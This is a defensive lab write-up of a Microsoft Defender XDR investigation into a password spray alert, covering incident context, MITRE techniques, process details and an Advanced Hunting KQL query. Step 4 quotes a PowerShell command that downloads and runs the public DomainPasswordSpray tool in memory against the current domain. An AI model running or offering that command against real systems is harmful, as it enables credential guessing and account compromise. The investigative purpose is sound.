# XDR: Credential Access

## Overview

This report documents investigating a Credential Access incident in Microsoft Defender XDR — a password spray attack carried out via a PowerShell script pulled from a public GitHub tool. The lab scenario: the security team received multiple alerts for failed sign-in attempts and a suspicious login from an unfamiliar IP, requiring investigation of a potential password spray attack, identification of the affected account(s), and a summary of findings for senior analysts. Device and user account details match the same lab environment used in the previous XDR investigations (vm-evil-xdr / vm-evil-xdr\evil-xdr).

## Investigation

### Step 1: Locate and Open the Alert

I opened the Incidents & alerts blade and set the time range to 6 months, then located the incident "Hands-on keyboard attack was launched from a compromised account (attack disruption)" (Incident ID: 119). Within its alert list, I scrolled to the "Password spraying" alert and opened its alert page to begin the investigation.

[SCREENSHOT: Incidents queue showing the flagged multi-alert incident with Lateral Movement and Attack Disruption tags]

### Step 2: Review Incident Context

This was flagged as a multi-alert incident — 9 correlated alerts, 16 activities, and 2 assets involved. It carried a Priority score of 100 (top priority), with notable priority factors including password spraying, lateral movement using RDP (blocked), a compromised account conducting a hands-on-keyboard attack, and potential human-operated malicious activity across multiple devices.

Three notable MITRE tactics and techniques were flagged at the incident level:
- System Service Discovery (T1007)
- Remote Desktop Protocol (T1021.001)
- System Network Configuration Discovery (T1016)

[SCREENSHOT: Incident overview showing priority assessment, notable alert types, and MITRE tactics]

The alert list included: Suspicious sequence of exploration activities, Unusual number of failed sign-in attempts, Compromised account conducting hands-on-keyboard attack, Hands-on-keyboard attack involving multiple devices, Password spraying, and two AMSI-blocked PowerShell hacktool detections ('Spritz' and 'MaleficAms', the latter already Resolved).

### Step 3: Review the Password Spraying Alert

Selecting the Password spraying alert specifically showed:
- Category: Credential access
- MITRE ATT&CK Technique: T1110 — Brute Force
- Detection source: EDR
- Service source: Microsoft Defender for Endpoint
- Severity: Medium

[SCREENSHOT: Password spraying alert details showing category, MITRE technique, and detection source]

### Step 4: Review the Alert Timeline and Script Content

Switching to the Alert timeline surfaced the flagged event: `powershell.exe` executed a script, recorded at 5:28:31 PM. Reviewing the full script content:

```powershell
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password ********** -Domain $Env:USERDOMAIN -Force}
```

[SCREENSHOT: Alert timeline showing the powershell.exe executed a script event with AMSI content]

This script forces the TLS 1.2 protocol, then uses `IEX`/`IWR` to download and execute DomainPasswordSpray — a known, publicly available password spraying tool — directly from GitHub, and immediately invokes it against the current domain with a supplied password. This is the same fileless, in-memory execution pattern seen in the earlier Execution investigation, applied here toward credential access instead of a generic post-exploitation payload.

### Step 5: Review the Process Execution Details

Expanding the initiating process on the flagged event showed:
- Process ID: 2760
- Execution details: Token elevation Default, Integrity level High
- Image file path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- Image file SHA1 hash, creation and modification time: Dec 6, 2025, 8:20:22 PM
- Remote session initiator device name: LAPTOP-FKQ39MRR
- User: vm-evil-xdr\evil-xdr

[SCREENSHOT: Expanded process details for the initiating powershell.exe process]

### Step 6: Response Actions and Advanced Hunting

Based on the investigation, this alert was confirmed malicious. Available response actions:
- Run Antivirus Scan
- Restrict App Execution on the machine
- Initiate Automated Investigation
- Initiate Live Response Session for manual remote intervention
- Isolate Device to prevent lateral movement or further access to other devices

[SCREENSHOT: Device action menu showing response options including Isolate Device]

For deeper investigation, I used the Go hunt option to pivot into Advanced Hunting with a pre-built KQL query scoped to the affected device:

```kql
let deviceName = "vm-evil-xdr";
let deviceId = "fc78d839ec1119595f4f097dd6378866d634e767";
search in (DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceLogonEvents, DeviceImageLoadEvents, DeviceEvents)
Timestamp between (ago(7d) .. now())
and (DeviceName == deviceName
//or DeviceId == deviceId
// Events affecting this target device
//or RemoteDeviceName == deviceName
)
```

This query searches across multiple device event tables for the top 100 events tied to the affected machine over the last 7 days, giving a broader activity timeline beyond just the flagged alert.

[SCREENSHOT: Advanced Hunting query results with timeline visualization showing an activity spike]

## Key Takeaways

- A password spray attack executed via a fileless PowerShell script follows the same detection pattern as other fileless techniques — the tool itself (DomainPasswordSpray) is publicly documented, which makes the downloaded script a fast, high-confidence indicator once the URL is checked.
- Credential access alerts benefit from incident-level context — this single Password spraying alert was one of nine correlated alerts in a broader attack disruption incident, which changes the response from "investigate one alert" to "contain a confirmed multi-stage compromise."
- The MITRE technique mapping (T1110 — Brute Force) at the alert level and the broader tactics (T1007, T1021.001, T1016) at the incident level tell two different parts of the story — the former is the specific action, the latter is the surrounding reconnaissance and lateral movement behavior.
- Pivoting into Advanced Hunting with a pre-scoped KQL query extends the investigation from "what triggered this one alert" to "what else happened on this device," which is essential before deciding on containment actions like isolation.

## Conclusion

I investigated a Credential Access alert involving a fileless PowerShell-based password spray attack (T1110), confirmed it as part of a broader nine-alert, attack-disruption incident, and used Advanced Hunting to extend visibility into the affected device before reviewing available containment actions.
